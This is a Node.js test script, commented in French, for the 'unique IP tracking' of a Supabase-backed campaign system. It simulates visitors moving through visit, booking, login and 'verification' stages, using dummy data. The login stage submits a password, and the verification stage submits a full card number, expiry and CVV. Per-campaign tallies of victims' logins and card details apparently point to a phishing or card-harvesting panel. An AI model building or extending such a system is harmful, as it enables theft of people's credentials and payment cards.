// Script de test pour vérifier le nouveau système de tracking des IP uniques
// Exécuter avec : node test_unique_tracking.js

import { LeadService, CampaignTotalService, CampaignService } from './lib/supabase.js';

async function testUniqueTracking() {
  console.log('🧪 Test du système de tracking des IP uniques...\n');

  const testCampaignId = 'test-campaign-unique';
  const testIP1 = '192.168.1.100';
  const testIP2 = '192.168.1.101';

  try {
    // Nettoyer les données de test existantes
    console.log('🧹 Nettoyage des données de test...');
    await cleanupTestData(testCampaignId);
    
    // Créer une campagne de test
    console.log('📝 Création d\'une campagne de test...');
    await createTestCampaign(testCampaignId);

    // Test 1: Première visite avec IP1
    console.log('\n📍 Test 1: Première visite avec IP1');
    const leadData1 = {
      email: 'test1@example.com',
      first_name: 'Test1',
      last_name: 'User1',
      ip_address: testIP1,
      user_agent: 'Test Browser 1',
      session_id: 'session_test_1'
    };

    const lead1 = await LeadService.createOrUpdateLead(testCampaignId, leadData1, 'visit');
    console.log(`✅ Lead créé: ${lead1.id}, isNewIP: ${lead1.isNewIP}`);
    await CampaignTotalService.updateCampaignTotals(testCampaignId, 'visit', lead1.isNewIP);

    // Test 2: Booking avec la même IP1 (même utilisateur)
    console.log('\n📍 Test 2: Booking avec la même IP1');
    const bookingData1 = {
      ...leadData1,
      phone: '+33123456789',
      description: 'Test booking 1'
    };
    const lead2 = await LeadService.createOrUpdateLead(testCampaignId, bookingData1, 'booking');
    console.log(`✅ Booking ajouté: ${lead2.id}, isNewIP: ${lead2.isNewIP}`);
    await CampaignTotalService.updateCampaignTotals(testCampaignId, 'booking', lead2.isNewIP);

    // Test 3: Nouvelle visite avec IP2 (nouvel utilisateur)
    console.log('\n📍 Test 3: Nouvelle visite avec IP2');
    const leadData2 = {
      email: 'test2@example.com',
      first_name: 'Test2',
      last_name: 'User2',
      ip_address: testIP2, // Nouvelle IP
      user_agent: 'Test Browser 2',
      session_id: 'session_test_2'
    };

    const lead3 = await LeadService.createOrUpdateLead(testCampaignId, leadData2, 'visit');
    console.log(`✅ Nouveau lead: ${lead3.id}, isNewIP: ${lead3.isNewIP}`);
    await CampaignTotalService.updateCampaignTotals(testCampaignId, 'visit', lead3.isNewIP);

    // Test 4: Login avec IP2
    console.log('\n📍 Test 4: Login avec IP2');
    const loginData2 = {
      ...leadData2,
      password: 'testpassword'
    };
    const lead4 = await LeadService.createOrUpdateLead(testCampaignId, loginData2, 'login');
    console.log(`✅ Login ajouté: ${lead4.id}, isNewIP: ${lead4.isNewIP}`);
    await CampaignTotalService.updateCampaignTotals(testCampaignId, 'login', lead4.isNewIP);

    // Test 5: Verification avec IP1 (utilisateur existant)
    console.log('\n📍 Test 5: Verification avec IP1 (utilisateur existant)');
    const verificationData1 = {
      ...leadData1,
      card_number: '4242424242424242',
      card_name: 'Test User 1',
      card_expiry: '12/25',
      card_cvv: '123',
      selected_plan: 'premium'
    };
    const lead5 = await LeadService.createOrUpdateLead(testCampaignId, verificationData1, 'verification');
    console.log(`✅ Verification ajoutée: ${lead5.id}, isNewIP: ${lead5.isNewIP}`);
    await CampaignTotalService.updateCampaignTotals(testCampaignId, 'verification', lead5.isNewIP);

    // Vérifier les totaux finaux
    console.log('\n📊 Vérification des totaux finaux...');
    const campaign = await CampaignService.getCampaignById(testCampaignId);
    
    const expectedTotals = {
      visits: 2,      // IP1 + IP2
      bookings: 1,    // IP1 seulement
      logins: 1,      // IP2 seulement
      verifications: 1 // IP1 seulement
    };

    console.log(`📈 Totaux attendus: Visits=${expectedTotals.visits}, Bookings=${expectedTotals.bookings}, Logins=${expectedTotals.logins}, Verifications=${expectedTotals.verifications}`);
    console.log(`📈 Totaux réels: Visits=${campaign.total_visits || 0}, Bookings=${campaign.total_bookings || 0}, Logins=${campaign.total_logins || 0}, Verifications=${campaign.total_verifications || 0}`);

    // Vérifier si les totaux correspondent
    const testsPass = 
      (campaign.total_visits || 0) === expectedTotals.visits &&
      (campaign.total_bookings || 0) === expectedTotals.bookings &&
      (campaign.total_logins || 0) === expectedTotals.logins &&
      (campaign.total_verifications || 0) === expectedTotals.verifications;

    if (testsPass) {
      console.log('\n🎉 Tous les tests sont passés avec succès !');
      console.log('✅ Le système de tracking des IP uniques fonctionne correctement');
    } else {
      console.log('\n❌ Certains tests ont échoué');
      console.log('⚠️ Vérifiez la logique de tracking des IP uniques');
    }

    // Nettoyer les données de test
    console.log('\n🧹 Nettoyage des données de test...');
    await cleanupTestData(testCampaignId);

  } catch (error) {
    console.error('❌ Erreur lors des tests:', error);
  }
}

async function createTestCampaign(campaignId) {
  try {
    const testCampaign = {
      id: campaignId,
      first_name: 'Test',
      last_name: 'Campaign',
      email: 'test@campaign.com',
      total_visits: 0,
      total_bookings: 0,
      total_logins: 0,
      total_verifications: 0,
      is_active: true,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString()
    };

    await CampaignService.createCampaign(testCampaign);
    console.log(`✅ Campagne de test créée: ${campaignId}`);
  } catch (error) {
    if (error.message.includes('duplicate key')) {
      console.log(`ℹ️ Campagne de test ${campaignId} existe déjà`);
    } else {
      throw error;
    }
  }
}

async function cleanupTestData(campaignId) {
  try {
    const { supabaseAdmin } = await import('./lib/supabase.js');
    
    // Supprimer les leads de test
    await supabaseAdmin
      .from('campaign_leads')
      .delete()
      .eq('campaign_id', campaignId);
    
    // Supprimer la campagne de test
    await supabaseAdmin
      .from('campaigns')
      .delete()
      .eq('id', campaignId);
    
    console.log(`✅ Données de test nettoyées pour ${campaignId}`);
  } catch (error) {
    console.warn(`⚠️ Erreur lors du nettoyage: ${error.message}`);
  }
}

// Exécuter le script
if (import.meta.url === `file://${process.argv[1]}`) {
  console.log('🚀 Démarrage des tests de tracking des IP uniques...\n');
  
  await testUniqueTracking();
  
  console.log('\n📋 Tests terminés.');
  process.exit(0);
} 